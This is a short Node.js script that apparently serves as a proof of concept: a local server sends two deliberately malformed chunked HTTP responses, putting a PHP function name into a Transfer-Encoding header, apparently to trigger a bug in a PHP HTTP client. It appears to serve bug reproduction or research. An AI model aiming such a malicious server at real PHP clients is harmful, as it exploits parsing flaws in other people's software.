require('net').createServer(function(socket) {
    socket.on('data', function(data) {
        socket.write('HTTP/1.1 200 OK\r\n');
        socket.write('Transfer-Encoding: chunked\r\n');
        socket.write('\r\n');

        var php_func = "hello"
        // var php_func = "ReflectionClass::export"

        socket.write('4\r\n');
        socket.write('func\r\n');
        socket.write('0\r\n');
        socket.write('\r\n');

        // 故意构造两条响应

        socket.write('HTTP/1.1 200 OK\r\n');
        socket.write('Transfer-Encoding: ' + php_func + '\r\n');
        socket.write('\r\n');
    });
}).listen(9090, '127.0.0.1');
